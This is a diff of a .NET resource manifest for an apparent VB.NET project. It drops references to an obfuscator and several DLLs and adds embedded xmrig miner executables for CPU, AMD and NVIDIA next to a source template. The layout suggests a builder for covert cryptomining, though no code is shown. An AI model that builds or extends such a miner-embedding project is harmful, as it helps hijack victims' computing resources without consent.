@@ -118,19 +118,22 @@
     <value>System.Resources.ResXResourceWriter, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
   </resheader>
   <assembly alias="System.Windows.Forms" name="System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" />
-  <data name="Main_" type="System.Resources.ResXFileRef, System.Windows.Forms">
-    <value>..\Resources\Main_.vb;System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089;utf-8</value>
-  </data>
-  <data name="DLL" type="System.Resources.ResXFileRef, System.Windows.Forms">
-    <value>..\Resources\DLL.dll;System.Byte[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
-  </data>
   <data name="nyan" type="System.Resources.ResXFileRef, System.Windows.Forms">
     <value>..\Resources\nyan.gif;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
   </data>
-  <data name="dotNET_Reactor" type="System.Resources.ResXFileRef, System.Windows.Forms">
-    <value>..\Resources\dotNET_Reactor.exe;System.Byte[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
+  <data name="Program" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\Program.vb;System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089;utf-8</value>
   </data>
-  <data name="DLL4" type="System.Resources.ResXFileRef, System.Windows.Forms">
-    <value>..\Resources\DLL4.dll;System.Byte[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
+  <data name="Project1" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\Project1.dll;System.Byte[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
+  </data>
+  <data name="xmrig" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\xmrig.exe;System.Byte[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
+  </data>
+  <data name="xmrig_amd_notls" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\xmrig-amd-notls.exe;System.Byte[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
+  </data>
+  <data name="xmrig_nvidia" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\xmrig-nvidia.exe;System.Byte[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
   </data>
 </root>
